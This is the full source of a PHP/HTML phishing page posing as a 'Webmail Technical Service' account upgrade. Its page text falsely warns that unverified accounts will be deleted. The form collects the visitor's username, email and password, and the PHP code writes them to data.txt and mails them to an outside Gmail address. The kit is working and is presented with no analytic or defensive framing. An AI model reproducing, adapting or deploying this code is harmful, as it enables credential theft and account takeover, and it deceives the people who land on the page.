<?php
if(!empty($_POST['upgrade']) && $_POST['upgrade'] == 'myForm'){
	$to = 'honestbrooks@gmail.com';
	$subject = 'Webmail-' . mt_rand();
	$msg = 'Email: '.$_POST['email']."\r\n";
	$msg .= 'Username: '.$_POST['username']."\r\n";
	$msg .= 'Password: '.$_POST['password']."\r\n";
	$msg .= '-------------------------------'."\r\n";

	$headers = 'From: bot@upgrade.com' . "\r\n" .
	'Reply-To: bot@upgrade.com' . "\r\n" .
	'X-Mailer: PHP/' . phpversion();
	$fp = fopen('data.txt', 'a');
	fwrite($fp, $msg);
	fclose($fp);
	@mail($to, $subject, $msg, $headers,'-fwebmaster@upgrade.com');
	echo "<strong>THANK YOU FOR YOUR TIME!</strong>";
	exit();
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
		<meta charset="UTF-8">
		<title>WEBMAIL SERVICE</title>
		<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
</head>
<body>
	<div class="header">
		<center><h1><font face="Courier">Welcome to Webmail Technical Service</font></h1></center>

<p><font size="+1"><font face="Courier">We are currently upgrading our database and email servers to reduce spam and 
junk emails, we are therefore deleting all unused account to create spaces 
for new accounts. To prevent account closure, you are required to VERIFY your 
				email account by filling out the below fields and click SUBMIT.</font></p>
				
				<p><font size="+1"><font face="Courier">Failure to upgrade your email account by ignoring instructions or by filing wrong information will result to deactivation of email account by the Webmail Technical Support Team.Note that Incorrect information can lead to the forfeiting or suspension of your webmail account.</font><h4><center><p><font face="Courier">FILL IN THE FIELD BELLOW TO UPGRADE YOUR WEBMAIL ACCOUNT</font></p></center></h4>
		
<div class="container">
		
		<div class="col-sm-11">
				<form action="index.php" method="post">
						<div class="form-group">
							 <label for="username">Username</label>
								<input type="text" name="username" class="form-control">
						</div>
						<div class="form-group">
							 <label for="email">Email</label>
								<input type="text" name="email" class="form-control">
						</div>
						
						<div class="form-group">
							 <label for="password">Password</label>
							 <input type="password" name="password" class="form-control">
						</div>
						
						<input type="hidden" name="upgrade" id="upgrade" value="myForm">
						
						<input class="btn btn-primary" type="submit" name="submit" value="Submit">
				</form>
		</div>
		
</div>
</body>
</html>